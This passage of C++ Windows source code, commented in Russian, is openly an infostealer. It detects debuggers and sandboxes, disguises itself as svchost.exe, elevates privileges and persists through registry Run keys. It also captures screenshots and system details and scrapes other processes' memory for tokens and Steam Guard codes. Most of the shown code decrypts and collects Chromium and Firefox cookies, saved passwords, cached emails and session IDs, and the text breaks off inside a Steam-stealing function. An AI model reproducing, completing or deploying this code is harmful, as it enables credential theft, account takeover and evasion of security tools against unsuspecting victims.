    if (CheckDebuggerOrAntivirus()) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Debugger or Antivirus detected, exiting");
        return true;
    }

    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    for (volatile int i = 0; i < 1000000; i++);
    QueryPerformanceCounter(&end);
    double elapsed = (end.QuadPart - start.QuadPart) * 1000.0 / freq.QuadPart;
    if (elapsed > 100) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Suspicious execution time detected: " + std::to_string(elapsed) + " ms, exiting");
        return true;
    }

    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnap != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te32 = { sizeof(te32) };
        int threadCount = 0;
        if (Thread32First(hThreadSnap, &te32)) {
            do {
                if (te32.th32OwnerProcessID == GetCurrentProcessId()) threadCount++;
            } while (Thread32Next(hThreadSnap, &te32));
        }
        CloseHandle(hThreadSnap);
        if (threadCount > 50) {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->appendLog("Too many threads detected: " + std::to_string(threadCount) + ", exiting");
            return true;
        }
    }

    char processName[MAX_PATH];
    GetModuleFileNameA(nullptr, processName, MAX_PATH);
    std::string procName = std::filesystem::path(processName).filename().string();
    if (procName.find("analyzer") != std::string::npos || procName.find("sandbox") != std::string::npos) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Suspicious process name detected: " + procName + ", exiting");
        return true;
    }

    return false;
}

// Маскировка процесса
void MaskProcess() {
    HANDLE hProcess = GetCurrentProcess();
    SetPriorityClass(hProcess, HIGH_PRIORITY_CLASS);
    wchar_t systemPath[MAX_PATH];
    GetSystemDirectoryW(systemPath, MAX_PATH);
    wcscat_s(systemPath, L"\\svchost.exe");
    SetFileAttributesW(systemPath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);

    typedef NTSTATUS(NTAPI *pNtSetInformationProcess)(HANDLE, DWORD, PVOID, ULONG);
    pNtSetInformationProcess NtSetInformationProcess = reinterpret_cast<pNtSetInformationProcess>(
        GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess"));
    if (NtSetInformationProcess) {
        wchar_t fakeName[] = L"svchost.exe";
        NtSetInformationProcess(hProcess, 0x1C, fakeName, sizeof(fakeName));
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Process masked as svchost.exe");
    } else {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to mask process");
    }
}

// Повышение привилегий и скрытие
void Stealth() {
    if (!g_mainWindow || !g_mainWindow->config.silent) return;

    SetFileAttributesA(GetCommandLineA(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    MaskProcess();

    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        TOKEN_PRIVILEGES tp = { 1 };
        LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
        CloseHandle(hToken);
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Privileges elevated");
    } else {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to elevate privileges");
    }
}

// Добавление в автозапуск
void AddToStartup() {
    if (!g_mainWindow || !g_mainWindow->config.autoStart) return;

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        char path[MAX_PATH];
        GetModuleFileNameA(nullptr, path, MAX_PATH);
        RegSetValueExA(hKey, "svchost", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
        RegCloseKey(hKey);
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Added to startup (HKEY_CURRENT_USER)");
    } else {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to add to startup (HKEY_CURRENT_USER)");
    }
}

// Обеспечение персистентности
void Persist() {
    if (!g_mainWindow || !g_mainWindow->config.persist) return;

    AddToStartup();
    HKEY hKey;
    if (RegCreateKeyA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS) {
        char path[MAX_PATH];
        GetModuleFileNameA(nullptr, path, MAX_PATH);
        RegSetValueExA(hKey, "SystemService", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
        RegCloseKey(hKey);
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Persisted in HKEY_LOCAL_MACHINE");
    } else {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to persist (HKEY_LOCAL_MACHINE)");
    }
}

// Отображение фейковой ошибки
void FakeError() {
    if (!g_mainWindow || !g_mainWindow->config.fakeError) return;

    MessageBoxA(nullptr, "System Error: svchost.exe has stopped working.", "System Error", MB_ICONERROR);
    std::lock_guard<std::mutex> lock(g_mutex);
    if (g_mainWindow) g_mainWindow->appendLog("Displayed fake error message");
}

// Получение системной информации
std::string GetCustomSystemInfo() {
    if (!g_mainWindow || !g_mainWindow->config.systemInfo) return "";

    std::string result;
    char username[256];
    DWORD usernameLen = sizeof(username);
    if (GetUserNameA(username, &usernameLen)) {
        result += "Username: " + std::string(username) + "\n";
    } else {
        result += "Username: Unknown\n";
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to get username");
    }

    char computerName[256];
    DWORD computerNameLen = sizeof(computerName);
    if (GetComputerNameA(computerName, &computerNameLen)) {
        result += "Computer Name: " + std::string(computerName) + "\n";
    } else {
        result += "Computer Name: Unknown\n";
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to get computer name");
    }

    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    result += "Processor Architecture: " + std::to_string(sysInfo.wProcessorArchitecture) + "\n";
    result += "Number of Processors: " + std::to_string(sysInfo.dwNumberOfProcessors) + "\n";

    MEMORYSTATUSEX memInfo = { sizeof(memInfo) };
    if (GlobalMemoryStatusEx(&memInfo)) {
        result += "Total Physical Memory: " + std::to_string(memInfo.ullTotalPhys / (1024 * 1024)) + " MB\n";
        result += "Available Physical Memory: " + std::to_string(memInfo.ullAvailPhys / (1024 * 1024)) + " MB\n";
    } else {
        result += "Memory Info: Unknown\n";
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to get memory info");
    }

    OSVERSIONINFOA osInfo = { sizeof(osInfo) };
#pragma warning(suppress: 4996)
    if (GetVersionExA(&osInfo)) {
        result += "OS Version: " + std::to_string(osInfo.dwMajorVersion) + "." + std::to_string(osInfo.dwMinorVersion) + "\n";
        result += "Build Number: " + std::to_string(osInfo.dwBuildNumber) + "\n";
    } else {
        result += "OS Info: Unknown\n";
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to get OS version");
    }

    ULONG bufferSize = 15000;
    std::vector<char> buffer(bufferSize);
    PIP_ADAPTER_INFO adapterInfo = reinterpret_cast<PIP_ADAPTER_INFO>(buffer.data());
    if (GetAdaptersInfo(adapterInfo, &bufferSize) == NO_ERROR) {
        for (PIP_ADAPTER_INFO adapter = adapterInfo; adapter; adapter = adapter->Next) {
            result += "Adapter Name: " + std::string(adapter->AdapterName) + "\n";
            result += "Description: " + std::string(adapter->Description) + "\n";
            result += "MAC Address: ";
            for (unsigned int i = 0; i < adapter->AddressLength; i++) {
                char mac[3];
                sprintf_s(mac, "%02X", adapter->Address[i]);
                result += mac;
                if (i < adapter->AddressLength - 1) result += "-";
            }
            result += "\nIP Address: " + std::string(adapter->IpAddressList.IpAddress.String) + "\n";
        }
    } else {
        result += "Network Info: Unknown\n";
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to get network adapters info");
    }

    return result;
}

// Создание скриншота
std::string TakeScreenshot() {
    if (!g_mainWindow || !g_mainWindow->config.screenshot) return "";

    HDC hScreenDC = GetDC(nullptr);
    if (!hScreenDC) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to get screen DC");
        return "";
    }

    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    if (!hMemoryDC) {
        ReleaseDC(nullptr, hScreenDC);
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to create memory DC");
        return "";
    }

    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    if (!hBitmap) {
        DeleteDC(hMemoryDC);
        ReleaseDC(nullptr, hScreenDC);
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to create bitmap");
        return "";
    }

    SelectObject(hMemoryDC, hBitmap);
    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
    Gdiplus::Bitmap bitmap(hBitmap, nullptr);
    CLSID clsid;
    HRESULT hr = CLSIDFromString(L"{557cf401-1a04-11d3-9a73-0000f81ef32e}", &clsid); // JPEG
    if (FAILED(hr)) {
        DeleteDC(hMemoryDC);
        ReleaseDC(nullptr, hScreenDC);
        DeleteObject(hBitmap);
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to get JPEG CLSID");
        return "";
    }

    std::string screenshotName = "screenshot_" + std::to_string(GetTickCount()) + ".jpg";
    std::wstring screenshotNameW(screenshotName.begin(), screenshotName.end());
    hr = bitmap.Save(screenshotNameW.c_str(), &clsid, nullptr);
    if (FAILED(hr)) {
        screenshotName.clear();
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to save screenshot");
    } else {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Screenshot saved: " + screenshotName);
    }

    DeleteDC(hMemoryDC);
    ReleaseDC(nullptr, hScreenDC);
    DeleteObject(hBitmap);
    return screenshotName;
}

// Дешифрование данных Chromium
std::string DecryptChromiumData(DATA_BLOB& encryptedData) {
    DATA_BLOB decryptedData;
    if (CryptUnprotectData(&encryptedData, nullptr, nullptr, nullptr, nullptr, 0, &decryptedData)) {
        std::string result((char*)decryptedData.pbData, decryptedData.cbData);
        LocalFree(decryptedData.pbData);
        return result;
    }

    std::lock_guard<std::mutex> lock(g_mutex);
    if (g_mainWindow) g_mainWindow->appendLog("Failed to decrypt Chromium data: " + std::to_string(GetLastError()));
    return "";
}

// Захват WebSocket сессий
std::string CaptureWebSocketSessions(const std::string& processName) {
    std::string result;
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to create process snapshot for WebSocket capture");
        return result;
    }

    PROCESSENTRY32W pe32 = { sizeof(pe32) };
    if (Process32FirstW(hProcessSnap, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, std::wstring(processName.begin(), processName.end()).c_str()) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    char buffer[4096];
                    SIZE_T bytesRead;
                    MEMORY_BASIC_INFORMATION mbi;
                    LPVOID address = 0;
                    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
                        if (mbi.State == MEM_COMMIT && (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_READONLY)) {
                            if (ReadProcessMemory(hProcess, address, buffer, sizeof(buffer), &bytesRead)) {
                                std::string memoryData(buffer, bytesRead);
                                std::regex wsRegex("wss?://[^\\s]+");
                                std::smatch match;
                                std::string::const_iterator searchStart(memoryData.cbegin());
                                while (std::regex_search(searchStart, memoryData.cend(), match, wsRegex)) {
                                    result += "WebSocket URL: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                                std::regex steamGuardRegex("Steam Guard Code: [A-Z0-9]{5}");
                                searchStart = memoryData.cbegin();
                                while (std::regex_search(searchStart, memoryData.cend(), match, steamGuardRegex)) {
                                    result += "Steam Guard Code: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                                std::regex tokenRegex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_-]{27}");
                                searchStart = memoryData.cbegin();
                                while (std::regex_search(searchStart, memoryData.cend(), match, tokenRegex)) {
                                    result += "WebSocket Token: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                            }
                        }
                        address = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32NextW(hProcessSnap, &pe32));
    }
    CloseHandle(hProcessSnap);
    return result;
}

// Захват WebRTC сессий
std::string CaptureWebRTCSessions(const std::string& processName) {
    std::string result;
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to create process snapshot for WebRTC capture");
        return result;
    }

    PROCESSENTRY32W pe32 = { sizeof(pe32) };
    if (Process32FirstW(hProcessSnap, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, std::wstring(processName.begin(), processName.end()).c_str()) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    char buffer[4096];
                    SIZE_T bytesRead;
                    MEMORY_BASIC_INFORMATION mbi;
                    LPVOID address = 0;
                    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
                        if (mbi.State == MEM_COMMIT && (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_READONLY)) {
                            if (ReadProcessMemory(hProcess, address, buffer, sizeof(buffer), &bytesRead)) {
                                std::string memoryData(buffer, bytesRead);
                                std::regex webrtcRegex("ice-ufrag:[a-zA-Z0-9+/=]+");
                                std::smatch match;
                                std::string::const_iterator searchStart(memoryData.cbegin());
                                while (std::regex_search(searchStart, memoryData.cend(), match, webrtcRegex)) {
                                    result += "WebRTC ICE Candidate: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                                std::regex ipRegex("\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b");
                                searchStart = memoryData.cbegin();
                                while (std::regex_search(searchStart, memoryData.cend(), match, ipRegex)) {
                                    result += "WebRTC IP: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                            }
                        }
                        address = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32NextW(hProcessSnap, &pe32));
    }
    CloseHandle(hProcessSnap);
    return result;
}

// Кража несохраненных данных браузера
std::string StealUnsavedBrowserData(const std::string& browserName, const std::string& cachePath) {
    std::string result;
    if (!std::filesystem::exists(cachePath)) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Cache path not found for " + browserName + ": " + cachePath);
        return result;
    }

    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(cachePath)) {
            if (entry.path().extension() == ".tmp" || entry.path().filename().string().find("Cache") != std::string::npos) {
                std::ifstream file(entry.path(), std::ios::binary);
                if (!file.is_open()) {
                    std::lock_guard<std::mutex> lock(g_mutex);
                    if (g_mainWindow) g_mainWindow->appendLog("Failed to open cache file for " + browserName + ": " + entry.path().string());
                    continue;
                }

                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();

                std::regex emailRegex("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}");
                std::smatch match;
                std::string::const_iterator searchStart(content.cbegin());
                while (std::regex_search(searchStart, content.cend(), match, emailRegex)) {
                    result += "[" + browserName + "] Unsaved Email: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }

                std::regex passRegex("pass(?:word)?=[^&\\s]+");
                searchStart = content.cbegin();
                while (std::regex_search(searchStart, content.cend(), match, passRegex)) {
                    result += "[" + browserName + "] Unsaved Password: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }

                std::regex autofillRegex("\"autofill\":\"[^\"]+\"");
                searchStart = content.cbegin();
                while (std::regex_search(searchStart, content.cend(), match, autofillRegex)) {
                    result += "[" + browserName + "] Autofill Data: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }

                std::regex sessionRegex("sessionid=[a-zA-Z0-9]+");
                searchStart = content.cbegin();
                while (std::regex_search(searchStart, content.cend(), match, sessionRegex)) {
                    result += "[" + browserName + "] Unsaved Session: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }
            }
        }
    } catch (const std::exception& e) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Error in StealUnsavedBrowserData for " + browserName + ": " + e.what());
    }

    return result;
}

// Кража кэшированных данных приложений
std::string StealAppCacheData(const std::string& appName, const std::string& cachePath) {
    std::string result;
    if (!std::filesystem::exists(cachePath)) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Cache path not found for " + appName + ": " + cachePath);
        return result;
    }

    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(cachePath)) {
            if (entry.path().filename().string().find("cache") != std::string::npos || entry.path().extension() == ".tmp") {
                std::ifstream file(entry.path(), std::ios::binary);
                if (!file.is_open()) {
                    std::lock_guard<std::mutex> lock(g_mutex);
                    if (g_mainWindow) g_mainWindow->appendLog("Failed to open cache file for " + appName + ": " + entry.path().string());
                    continue;
                }

                std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
                file.close();

                std::regex tokenRegex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_-]{27}");
                std::smatch match;
                std::string::const_iterator searchStart(content.cbegin());
                while (std::regex_search(searchStart, content.cend(), match, tokenRegex)) {
                    result += "[" + appName + "] Cached Token: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }

                std::regex emailRegex("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}");
                searchStart = content.cbegin();
                while (std::regex_search(searchStart, content.cend(), match, emailRegex)) {
                    result += "[" + appName + "] Cached Email: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }

                std::regex sessionRegex("sessionid=[a-zA-Z0-9]+");
                searchStart = content.cbegin();
                while (std::regex_search(searchStart, content.cend(), match, sessionRegex)) {
                    result += "[" + appName + "] Cached Session: " + match[0].str() + "\n";
                    searchStart = match.suffix().first;
                }
            }
        }
    } catch (const std::exception& e) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Error in StealAppCacheData for " + appName + ": " + e.what());
    }

    return result;
}

// Кража данных Chromium
std::string StealChromiumData(const std::string& browserName, const std::string& dbPath) {
    std::string result;
    if (!g_mainWindow || (!g_mainWindow->config.cookies && !g_mainWindow->config.passwords)) return result;

    std::string cookiesDbPath = dbPath + "Cookies";
    std::string loginDbPath = dbPath + "Login Data";
    sqlite3* db = nullptr;

    // Кража cookies
    if (g_mainWindow->config.cookies && std::filesystem::exists(cookiesDbPath)) {
        if (sqlite3_open(cookiesDbPath.c_str(), &db) == SQLITE_OK) {
            sqlite3_stmt* stmt;
            const char* query = "SELECT host_key, name, encrypted_value FROM cookies";
            if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    std::string host = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                    std::string name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                    DATA_BLOB encryptedData = { sqlite3_column_bytes(stmt, 2), (BYTE*)sqlite3_column_blob(stmt, 2) };
                    std::string value = DecryptChromiumData(encryptedData);
                    if (!value.empty()) {
                        if (host.find("mail.google.com") != std::string::npos || host.find("outlook.com") != std::string::npos ||
                            host.find("yahoo.com") != std::string::npos || host.find("mail.ru") != std::string::npos ||
                            host.find("aol.com") != std::string::npos || host.find("protonmail.com") != std::string::npos ||
                            host.find("icloud.com") != std::string::npos || host.find("steampowered.com") != std::string::npos ||
                            host.find("roblox.com") != std::string::npos) {
                            result += "[" + browserName + "] Critical Cookie (" + host + ") | " + name + " | " + value + "\n";
                        } else {
                            result += "[" + browserName + "] Cookie | " + host + " | " + name + " | " + value + "\n";
                        }
                    }
                }
                sqlite3_finalize(stmt);
            } else {
                std::lock_guard<std::mutex> lock(g_mutex);
                if (g_mainWindow) g_mainWindow->appendLog("Failed to prepare SQLite statement for cookies in " + browserName);
            }
            sqlite3_close(db);
        } else {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->appendLog("Failed to open Cookies database for " + browserName);
        }
    }

    // Кража паролей
    db = nullptr;
    if (g_mainWindow->config.passwords && std::filesystem::exists(loginDbPath)) {
        if (sqlite3_open(loginDbPath.c_str(), &db) == SQLITE_OK) {
            sqlite3_stmt* stmt;
            const char* query = "SELECT origin_url, username_value, password_value FROM logins";
            if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    std::string url = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                    std::string username = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                    DATA_BLOB encryptedData = { sqlite3_column_bytes(stmt, 2), (BYTE*)sqlite3_column_blob(stmt, 2) };
                    std::string password = DecryptChromiumData(encryptedData);
                    if (!password.empty()) {
                        if (url.find("mail.google.com") != std::string::npos || url.find("outlook.com") != std::string::npos ||
                            url.find("yahoo.com") != std::string::npos || url.find("mail.ru") != std::string::npos ||
                            url.find("aol.com") != std::string::npos || url.find("protonmail.com") != std::string::npos ||
                            url.find("icloud.com") != std::string::npos || url.find("steampowered.com") != std::string::npos ||
                            url.find("roblox.com") != std::string::npos) {
                            result += "[" + browserName + "] Critical Password (" + url + ") | " + username + " | " + password + "\n";
                        } else {
                            result += "[" + browserName + "] Password | " + url + " | " + username + " | " + password + "\n";
                        }
                    }
                }
                sqlite3_finalize(stmt);
            } else {
                std::lock_guard<std::mutex> lock(g_mutex);
                if (g_mainWindow) g_mainWindow->appendLog("Failed to prepare SQLite statement for passwords in " + browserName);
            }
            sqlite3_close(db);
        } else {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->appendLog("Failed to open Login Data database for " + browserName);
        }
    }

    return result;
}

// Кража данных Firefox
std::string StealFirefoxData(const std::string& profilePath) {
    std::string result;
    if (!g_mainWindow || (!g_mainWindow->config.cookies && !g_mainWindow->config.passwords)) return result;

    std::string cookiesDbPath = profilePath + "/cookies.sqlite";
    sqlite3* db = nullptr;

    // Кража cookies
    if (g_mainWindow->config.cookies && std::filesystem::exists(cookiesDbPath)) {
        if (sqlite3_open(cookiesDbPath.c_str(), &db) == SQLITE_OK) {
            sqlite3_stmt* stmt;
            const char* query = "SELECT host, name, value FROM moz_cookies";
            if (sqlite3_prepare_v2(db, query, -1, &stmt, nullptr) == SQLITE_OK) {
                while (sqlite3_step(stmt) == SQLITE_ROW) {
                    std::string host = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
                    std::string name = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
                    std::string value = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2));
                    if (host.find("mail.google.com") != std::string::npos || host.find("outlook.com") != std::string::npos ||
                        host.find("yahoo.com") != std::string::npos || host.find("mail.ru") != std::string::npos ||
                        host.find("aol.com") != std::string::npos || host.find("protonmail.com") != std::string::npos ||
                        host.find("icloud.com") != std::string::npos || host.find("steampowered.com") != std::string::npos ||
                        host.find("roblox.com") != std::string::npos) {
                        result += "[Firefox] Critical Cookie (" + host + ") | " + name + " | " + value + "\n";
                    } else {
                        result += "[Firefox] Cookie | " + host + " | " + name + " | " + value + "\n";
                    }
                }
                sqlite3_finalize(stmt);
            } else {
                std::lock_guard<std::mutex> lock(g_mutex);
                if (g_mainWindow) g_mainWindow->appendLog("Failed to prepare SQLite statement for cookies in Firefox");
            }
            sqlite3_close(db);
        } else {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->appendLog("Failed to open cookies.sqlite for Firefox");
        }
    }

    // Кража паролей
    // Примечание: Firefox использует NSS для шифрования паролей. Для реальной работы нужно интегрировать NSS.
    // Здесь реализована заглушка для демонстрации.
    std::string loginsJsonPath = profilePath + "/logins.json";
    if (g_mainWindow->config.passwords && std::filesystem::exists(loginsJsonPath)) {
        std::ifstream loginsFile(loginsJsonPath);
        if (loginsFile.is_open()) {
            std::string content((std::istreambuf_iterator<char>(loginsFile)), std::istreambuf_iterator<char>());
            loginsFile.close();

            // Парсинг JSON вручную (упрощённо, для демонстрации)
            std::regex loginRegex("\"hostname\":\"([^\"]+)\",\"encryptedUsername\":\"([^\"]+)\",\"encryptedPassword\":\"([^\"]+)\"");
            std::smatch match;
            std::string::const_iterator searchStart(content.cbegin());
            while (std::regex_search(searchStart, content.cend(), match, loginRegex)) {
                std::string url = match[1].str();
                std::string encryptedUsername = match[2].str();
                std::string encryptedPassword = match[3].str();
                // Здесь должна быть дешифровка через NSS, но для примера просто выводим зашифрованные данные
                result += "[Firefox] Password (Encrypted) | " + url + " | Username: " + encryptedUsername + " | Password: " + encryptedPassword + "\n";
                searchStart = match.suffix().first;
            }
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->appendLog("Firefox passwords extracted (encrypted, requires NSS for decryption)");
        } else {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->appendLog("Failed to open logins.json for Firefox");
        }
    }

    return result;
}

// Кража данных браузеров
std::string StealBrowserData() {
    std::string result;
    if (!g_mainWindow || (!g_mainWindow->config.cookies && !g_mainWindow->config.passwords)) return result;

    char* appDataPath;
    size_t len;
    _dupenv_s(&appDataPath, &len, "APPDATA");
    if (!appDataPath) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to get APPDATA path");
        return result;
    }
    std::string appData(appDataPath);
    free(appDataPath);

    char* localAppDataPath;
    _dupenv_s(&localAppDataPath, &len, "LOCALAPPDATA");
    if (!localAppDataPath) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to get LOCALAPPDATA path");
        return result;
    }
    std::string localAppData(localAppDataPath);
    free(localAppDataPath);

    // Путь к данным браузеров
    std::vector<std::pair<std::string, std::string>> browserPaths = {
        {"Chrome", localAppData + "\\Google\\Chrome\\User Data\\Default\\"},
        {"Edge", localAppData + "\\Microsoft\\Edge\\User Data\\Default\\"},
        {"Opera", appData + "\\Opera Software\\Opera Stable\\"},
        {"OperaGX", appData + "\\Opera Software\\Opera GX Stable\\"}
    };

    // Кража данных Chromium-браузеров
    for (const auto& browser : browserPaths) {
        std::string browserData = StealChromiumData(browser.first, browser.second);
        if (!browserData.empty()) {
            result += browserData;
        }
        std::string unsavedData = StealUnsavedBrowserData(browser.first, browser.second + "Cache\\");
        if (!unsavedData.empty()) {
            result += unsavedData;
        }
    }

    // Кража данных Firefox
    std::string firefoxPath = appData + "\\Mozilla\\Firefox\\Profiles\\";
    if (std::filesystem::exists(firefoxPath)) {
        try {
            for (const auto& entry : std::filesystem::directory_iterator(firefoxPath)) {
                if (entry.is_directory()) {
                    std::string profileData = StealFirefoxData(entry.path().string());
                    if (!profileData.empty()) {
                        result += profileData;
                    }
                }
            }
        } catch (const std::exception& e) {
            std::lock_guard<std::mutex> lock(g_mutex);
            if (g_mainWindow) g_mainWindow->appendLog("Error accessing Firefox profiles: " + std::string(e.what()));
        }
    }

    return result;
}

// Кража данных Steam
std::string StealSteamData() {
    std::string result;
    if (!g_mainWindow || (!g_mainWindow->config.steam && !g_mainWindow->config.steamMAFile)) return result;

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Valve\\Steam", 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        std::lock_guard<std::mutex> lock(g_mutex);
        if (g_mainWindow) g_mainWindow->appendLog("Failed to open Steam registry key");
        return result;
    }

    char steamPath[MAX_PATH];
    DWORD pathSize = sizeof(steamPath);
